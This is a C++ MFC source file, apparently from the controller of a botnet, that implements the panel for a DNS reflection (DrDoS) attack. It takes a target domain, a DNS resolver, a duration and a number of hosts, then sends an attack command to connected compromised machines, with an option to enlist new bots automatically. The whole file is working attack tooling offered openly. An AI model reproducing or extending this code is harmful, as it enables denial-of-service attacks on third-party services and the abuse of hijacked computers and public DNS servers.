// DDOSDrDos.cpp : implementation file
//

#include "pcl.h"
#include "Client.h"
#include "DDOSDrDos.h"
#include "PcView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;

/////////////////////////////////////////////////////////////////////////////
// CDDOSDrDos

IMPLEMENT_DYNCREATE(CDDOSDrDos, CFormView)

CDDOSDrDos::CDDOSDrDos()
	: CFormView(CDDOSDrDos::IDD)
{
	//{{AFX_DATA_INIT(CDDOSDrDos)
	m_check_drdos_auto = FALSE;
	m_check_drdos_online = FALSE;
	m_drdos_addr = _T("www.xx.com");
	m_drdos_dns = _T("8.8.8.8");
	m_drdos_hostnum = 100;
	m_drdos_time = 0;
	//}}AFX_DATA_INIT
}

CDDOSDrDos::~CDDOSDrDos()
{
}

void CDDOSDrDos::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOSDrDos)
	DDX_Control(pDX, IDC_SPIN_DRDOS_TIME, m_spin_drdos_time);
	DDX_Control(pDX, IDC_SPIN_DRDOS_HOST, m_spin_drdos_host);
	DDX_Check(pDX, IDC_CHECK_DRDOS_AUTO, m_check_drdos_auto);
	DDX_Check(pDX, IDC_CHECK_DRDOS_ONLINE, m_check_drdos_online);
	DDX_Text(pDX, IDC_DRDOS_ADDR, m_drdos_addr);
	DDV_MaxChars(pDX, m_drdos_addr, 500);
	DDX_Text(pDX, IDC_DRDOS_DNS, m_drdos_dns);
	DDV_MaxChars(pDX, m_drdos_dns, 500);
	DDX_Text(pDX, IDC_DRDOS_HOSTNUM, m_drdos_hostnum);
	DDX_Text(pDX, IDC_DRDOS_TIME, m_drdos_time);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDDOSDrDos, CFormView)
	//{{AFX_MSG_MAP(CDDOSDrDos)
	ON_BN_CLICKED(IDC_DRDOS_START, OnDrdosStart)
	ON_BN_CLICKED(IDC_DRDOS_STOP, OnDrdosStop)
	ON_BN_CLICKED(IDC_SLECT_ALL, OnSlectAll)
	ON_BN_CLICKED(IDC_SLECT_NOW, OnSlectNow)
	ON_BN_CLICKED(IDC_UNSLECT_ALL, OnUnslectAll)
	ON_BN_CLICKED(IDC_UNSLECT_NOW, OnUnslectNow)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDOSDrDos diagnostics

#ifdef _DEBUG
void CDDOSDrDos::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOSDrDos::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CDDOSDrDos message handlers

void CDDOSDrDos::OnDrdosStart() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	//过滤各信息
	CString strTime, strHostNum;
	GetDlgItem(IDC_DRDOS_TIME)->GetWindowText(strTime);
	GetDlgItem(IDC_DRDOS_HOSTNUM)->GetWindowText(strHostNum);
	
	if (m_drdos_dns.IsEmpty() || m_drdos_addr.IsEmpty() || strTime.IsEmpty() || strHostNum.IsEmpty())
	{
		::MessageBox(0,"请输入完整信息","错误", MB_ICONINFORMATION);
		return;
	}
	
	if (m_drdos_time <0 )
	{
		::MessageBox(0,"时间范围:大于0","错误", MB_ICONINFORMATION);
		return;
	}
	
	if (m_drdos_hostnum <1 )
	{
		::MessageBox(0,"主机范围:大于1","错误", MB_ICONINFORMATION);
		return;
	}
	
	DATTACK m_Attack;
	ZeroMemory(&m_Attack,sizeof(DATTACK));
	//获取域名
	strcpy(m_Attack.Target,m_drdos_addr.GetBuffer(0));
	//获取dns地址
	strcpy(m_Attack.DNSTarget,m_drdos_dns.GetBuffer(0));
	//获取时间
	m_Attack.AttackTime = m_drdos_time;
	//攻击类型类型
	m_Attack.AttackType = 15;
	
	CString m_DdosType = "DNS";
	strcpy(m_Attack.DDOSType,m_DdosType.GetBuffer(0));
	
	//获取参与主机..
	INT HostNums=-1;
	if(m_check_drdos_online == FALSE)
		HostNums = m_drdos_hostnum;
	//获取新上线主机是否自动参数
	BOOL Auto=FALSE;
	if(m_check_drdos_auto == TRUE)
	{
		g_pConnectView->m_iocpServer->m_bIsAutoD=true;
	}
	else
	{
		g_pConnectView->m_iocpServer->m_bIsAutoD=false;
	}
	
	memcpy(g_pConnectView->m_iocpServer->m_strbuff, &m_Attack, sizeof(DATTACK));		
	
	g_pConnectView->SendDDosAttackCommand(&m_Attack,HostNums);
	
	GetDlgItem(IDC_COMBO_WEBMODLE)->EnableWindow(FALSE);
}

void CDDOSDrDos::OnDrdosStop() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SendDDostStopCommand("DNS");
}

void CDDOSDrDos::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_spin_drdos_time.SetRange(0,10000);
	m_spin_drdos_time.SetPos(0);
	m_spin_drdos_time.SetBuddy(GetDlgItem(IDC_DRDOS_TIME));
	
	m_spin_drdos_host.SetRange(1,10000);
	m_spin_drdos_host.SetPos(100);
	m_spin_drdos_host.SetBuddy(GetDlgItem(IDC_DRDOS_HOSTNUM));
}

void CDDOSDrDos::OnSlectAll() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectAll();
}

void CDDOSDrDos::OnSlectNow() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectNow();
}

void CDDOSDrDos::OnUnslectAll() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectAll();
}

void CDDOSDrDos::OnUnslectNow() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectNow();
}
